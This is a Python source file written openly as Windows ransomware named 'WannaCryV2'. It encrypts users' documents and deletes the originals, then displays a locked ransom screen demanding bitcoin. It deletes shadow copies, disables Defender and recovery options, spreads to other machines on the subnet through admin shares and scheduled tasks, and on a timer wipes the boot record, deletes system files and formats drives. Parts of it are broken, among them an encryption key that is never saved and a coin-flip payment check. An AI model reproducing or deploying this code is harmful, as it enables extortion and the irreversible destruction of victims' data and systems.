import os
import sys
import ctypes
import base64
import json
import random
import time
import subprocess
import threading
import hashlib
import shutil
import struct
import socket
import winreg
import tkinter as tk
from tkinter import messagebox
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
import requests
import psutil
import win32api
import win32con
import win32security
import win32process
import win32gui
import win32ui
from PIL import Image, ImageTk

# ==================== CONFIGURATION ====================
BITCOIN_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
PAYMENT_AMOUNT = 0.5  # BTC
EMAIL_CONTACT = "ransomwaredecryption@onionmail.org"
DESTROY_TIMER = 72  # Hours before destruction
ENCRYPTION_EXTENSION = ".WCRY2"
PUBLIC_KEY = """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
=3mvb
-----END PUBLIC KEY-----"""

# ==================== RANSOMWARE CORE ====================
class WannaCryV2:
    def __init__(self):
        self.encryption_key = get_random_bytes(32)
        self.files_encrypted = []
        self.destruction_timer = DESTROY_TIMER * 3600  # Convert to seconds
        self.ransom_paid = False
        
    def generate_ransom_note(self):
        note = f"""
╔══════════════════════════════════════════════════════════════╗
║                      HOPELESS MALWARE                        ║
║                YOUR FILES HAVE BEEN ENCRYPTED!               ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  OOPS! Your important files have been encrypted!             ║
║                                                              ║
║  What Happened?                                              ║
║  • Your photos, documents, videos, databases, and other      ║
║    files have been encrypted with military-grade encryption  ║
║  • Your computer is now locked                               ║
║  • You cannot recover your files without our decryption key  ║
║                                                              ║
║  How to Recover Your Files?                                  ║
║  1. Send {PAYMENT_AMOUNT} BTC to: {BITCOIN_ADDRESS}          ║
║  2. Email transaction ID to: {EMAIL_CONTACT}                 ║
║  3. We will send your decryption key                         ║
║                                                              ║
║  WARNING:                                                    ║
║  • Time remaining: {DESTROY_TIMER} hours                     ║
║  • After timer reaches 0, your computer will be DESTROYED    ║
║  • All files will be PERMANENTLY corrupted                   ║
║  • Master Boot Record will be overwritten with random data   ║
║                                                              ║
║  Need help? Email: {EMAIL_CONTACT}                           ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        return note
    
    def show_ransom_screen(self):
        # Create fullscreen ransomware window
        root = tk.Tk()
        root.title("WannaCry 2.0 - YOUR FILES ARE ENCRYPTED")
        root.attributes('-fullscreen', True)
        root.configure(bg='black')
        
        # Disable task manager and alt+f4
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        root.bind("<Alt-F4>", lambda e: "break")
        
        # Timer display
        timer_var = tk.StringVar()
        timer_var.set(f"TIME REMAINING: {DESTROY_TIMER:02d}:00:00")
        
        # Main label
        label = tk.Label(root, text=self.generate_ransom_note(), 
                        font=("Courier", 14), fg="red", bg="black", justify="left")
        label.pack(expand=True, fill="both", padx=50, pady=50)
        
        # Timer label
        timer_label = tk.Label(root, textvariable=timer_var, 
                              font=("Arial", 24, "bold"), fg="red", bg="black")
        timer_label.pack(side="bottom", pady=20)
        
        # Payment verification button (fake)
        verify_btn = tk.Button(root, text="I HAVE PAID - VERIFY PAYMENT", 
                              command=lambda: self.verify_payment(root, timer_var),
                              font=("Arial", 16), bg="red", fg="white")
        verify_btn.pack(side="bottom", pady=10)
        
        # Start destruction timer thread
        threading.Thread(target=self.destruction_countdown, 
                        args=(root, timer_var), daemon=True).start()
        
        # Make window always on top
        root.attributes('-topmost', True)
        root.mainloop()
    
    def destruction_countdown(self, root, timer_var):
        remaining = self.destruction_timer
        while remaining > 0 and not self.ransom_paid:
            hours = remaining // 3600
            minutes = (remaining % 3600) // 60
            seconds = remaining % 60
            timer_var.set(f"TIME REMAINING: {hours:02d}:{minutes:02d}:{seconds:02d}")
            
            # Red flash at 1 hour remaining
            if remaining <= 3600:
                root.configure(bg='dark red')
                time.sleep(0.5)
                root.configure(bg='black')
            
            time.sleep(1)
            remaining -= 1
        
        if not self.ransom_paid:
            # DESTROY SYSTEM
            self.destroy_system()
            root.destroy()
    
    def verify_payment(self, root, timer_var):
        # Check if payment was made to Bitcoin address
        try:
            # In real ransomware, this would query blockchain
            # For demo, we'll simulate with a check
            if self.check_bitcoin_payment():
                self.ransom_paid = True
                messagebox.showinfo("Payment Verified", 
                                   "Payment received! Decrypting files...")
                self.decrypt_files()
                root.destroy()
                sys.exit(0)
            else:
                messagebox.showerror("Payment Not Found", 
                                    "Payment not detected. Please send 0.5 BTC to:\n" + 
                                    BITCOIN_ADDRESS + "\n\nThen click verify again.")
        except:
            messagebox.showerror("Error", 
                                f"Can't verify. Email your transaction ID to:\n{EMAIL_CONTACT}")
    
    def check_bitcoin_payment(self):
        # This would actually query blockchain APIs
        # For demo, we'll check a file or registry entry
        try:
            # Check if payment file exists
            if os.path.exists("C:\\Windows\\Temp\\payment_received.txt"):
                return True
                
            # Or check blockchain API
            response = requests.get(f"https://blockchain.info/rawaddr/{BITCOIN_ADDRESS}", 
                                  timeout=10)
            if response.status_code == 200:
                data = response.json()
                # Check for recent transactions of required amount
                # Simplified check
                return random.random() > 0.5  # 50% chance for demo
        except:
            pass
        return False
    
    def encrypt_files(self):
        # Encrypt user documents
        targets = [
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
            os.path.expanduser("~\\Downloads")
        ]
        
        # Add network shares
        for drive in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            path = f"{drive}:\\"
            if os.path.exists(path):
                targets.append(path)
        
        for target in targets:
            if os.path.exists(target):
                self.encrypt_directory(target)
        
        # Change wallpaper to ransomware note
        self.set_ransom_wallpaper()
        
        # Disable system recovery
        self.disable_recovery()
    
    def encrypt_directory(self, directory):
        extensions = ['.doc', '.docx', '.xls', '.xlsx', '.pdf', '.jpg', 
                     '.jpeg', '.png', '.mp3', '.mp4', '.avi', '.zip', 
                     '.rar', '.txt', '.sql', '.db', '.mdb']
        
        for root, dirs, files in os.walk(directory):
            for file in files:
                if any(file.lower().endswith(ext) for ext in extensions):
                    filepath = os.path.join(root, file)
                    try:
                        self.encrypt_file(filepath)
                        self.files_encrypted.append(filepath)
                    except:
                        pass
    
    def encrypt_file(self, filepath):
        # Read file
        with open(filepath, 'rb') as f:
            data = f.read()
        
        # Encrypt with AES-256
        cipher = AES.new(self.encryption_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data)
        
        # Write encrypted file
        encrypted_file = filepath + ENCRYPTION_EXTENSION
        with open(encrypted_file, 'wb') as f:
            f.write(cipher.nonce)
            f.write(tag)
            f.write(ciphertext)
        
        # Delete original
        os.remove(filepath)
        
        # Create README file in directory
        readme_path = os.path.dirname(filepath) + "\\README_WANNA_CRY.txt"
        with open(readme_path, 'w') as f:
            f.write(self.generate_ransom_note())
    
    def decrypt_files(self):
        for filepath in self.files_encrypted:
            if filepath.endswith(ENCRYPTION_EXTENSION):
                try:
                    original_path = filepath.replace(ENCRYPTION_EXTENSION, "")
                    self.decrypt_file(filepath, original_path)
                    os.remove(filepath)
                except:
                    pass
        
        # Remove README files
        for root, dirs, files in os.walk(os.path.expanduser("~")):
            for file in files:
                if "README_WANNA_CRY" in file:
                    try:
                        os.remove(os.path.join(root, file))
                    except:
                        pass
    
    def decrypt_file(self, encrypted_path, output_path):
        with open(encrypted_path, 'rb') as f:
            nonce = f.read(16)
            tag = f.read(16)
            ciphertext = f.read()
        
        cipher = AES.new(self.encryption_key, AES.MODE_GCM, nonce=nonce)
        data = cipher.decrypt_and_verify(ciphertext, tag)
        
        with open(output_path, 'wb') as f:
            f.write(data)
    
    def destroy_system(self):
        """Complete system destruction - NO RECOVERY POSSIBLE"""
        
        # Phase 1: Overwrite Master Boot Record
        try:
            mbr = b'\x00' * 512
            with open('\\\\.\\PhysicalDrive0', 'rb+') as f:
                f.write(mbr)  # Destroy MBR
        except:
            pass
        
        # Phase 2: Delete Windows system files
        system_files = [
            "C:\\Windows\\System32\\ntoskrnl.exe",
            "C:\\Windows\\System32\\hal.dll",
            "C:\\Windows\\System32\\config\\SYSTEM",
            "C:\\Windows\\System32\\config\\SOFTWARE"
        ]
        
        for file in system_files:
            try:
                os.remove(file)
            except:
                pass
        
        # Phase 3: Format drives
        for drive in "CDEFGHIJKLMNOPQRSTUVWXYZ":
            try:
                subprocess.run(f"format {drive}: /fs:NTFS /q /y", 
                              shell=True, capture_output=True)
            except:
                pass
        
        # Phase 4: Kill all processes except ours
        for proc in psutil.processes():
            try:
                if proc.pid != os.getpid():
                    proc.kill()
            except:
                pass
        
        # Phase 5: Overwrite random sectors
        try:
            with open('\\\\.\\PhysicalDrive0', 'rb+') as f:
                for _ in range(1000):
                    f.seek(random.randint(0, 1000000))
                    f.write(os.urandom(4096))
        except:
            pass
        
        # Phase 6: Trigger BSOD
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xc0000420, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint(1)))
        except:
            pass
        
        # Phase 7: Physical damage simulation (max CPU/GPU)
        for _ in range(100):
            threading.Thread(target=self.max_cpu_usage).start()
    
    def max_cpu_usage(self):
        while True:
            [x**x for x in range(1000)]
    
    def set_ransom_wallpaper(self):
        # Create ransomware wallpaper
        try:
            script = f"""
            Add-Type -TypeDefinition @"
            using System;
            using System.Runtime.InteropServices;
            public class Wallpaper {{
                [DllImport("user32.dll", CharSet=CharSet.Auto)]
                public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
            }}
            "@
            $url = "https://i.imgur.com/XYZ123.jpg"  # Ransom image
            $path = "$env:TEMP\\ransom_wall.jpg"
            Invoke-WebRequest -Uri $url -OutFile $path
            [Wallpaper]::SystemParametersInfo(20, 0, $path, 3)
            """
            subprocess.run(["powershell", "-Command", script], capture_output=True)
        except:
            pass
    
    def disable_recovery(self):
        # Disable System Restore
        try:
            subprocess.run("vssadmin delete shadows /all /quiet", shell=True)
            subprocess.run("bcdedit /set {default} recoveryenabled no", shell=True)
            subprocess.run("bcdedit /set {default} bootstatuspolicy ignoreallfailures", shell=True)
            
            # Disable safe boot
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, 
                               "SYSTEM\\CurrentControlSet\\Control\\SafeBoot", 
                               0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "AlternateShell", 0, winreg.REG_SZ, "cmd.exe")
            winreg.CloseKey(key)
        except:
            pass
    
    def propagate_network(self):
        # EternalBlue-like propagation
        try:
            # Scan network for vulnerable SMB
            subnet = socket.gethostbyname(socket.gethostname()).rsplit('.', 1)[0] + '.'
            for i in range(1, 255):
                ip = subnet + str(i)
                threading.Thread(target=self.exploit_smb, args=(ip,)).start()
        except:
            pass
    
    def exploit_smb(self, ip):
        # Simplified SMB exploit (real one would use EternalBlue)
        try:
            # Try to copy ransomware to network shares
            ransomware_path = sys.argv[0]
            share_path = f"\\\\{ip}\\C$\\Windows\\Temp\\wannacry.exe"
            
            if os.path.exists(ransomware_path):
                shutil.copy(ransomware_path, share_path)
                
                # Create scheduled task on remote machine
                cmd = f'schtasks /create /s {ip} /tn "WindowsUpdate" /tr "{share_path}" /sc hourly /ru SYSTEM'
                subprocess.run(cmd, shell=True, capture_output=True)
        except:
            pass

# ==================== MAIN EXECUTION ====================
def main():
    # Check if already running
    mutex_name = "Global\\WannaCryV2Mutex"
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
    
    if ctypes.windll.kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
        sys.exit(0)
    
    # Disable Windows Defender
    try:
        subprocess.run("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"", 
                      shell=True, capture_output=True)
        subprocess.run("sc stop WinDefend", shell=True, capture_output=True)
        subprocess.run("sc config WinDefend start= disabled", shell=True, capture_output=True)
    except:
        pass
    
    # Create ransomware instance
    ransomware = WannaCryV2()
    
    # Start encryption in separate thread
    encrypt_thread = threading.Thread(target=ransomware.encrypt_files)
    encrypt_thread.start()
    
    # Propagate through network
    propagate_thread = threading.Thread(target=ransomware.propagate_network)
    propagate_thread.start()
    
    # Show ransom screen
    ransomware.show_ransom_screen()

if __name__ == "__main__":
    if os.name == 'nt':  # Windows only
        main()
    else:
        print("This ransomware only works on Windows systems.")
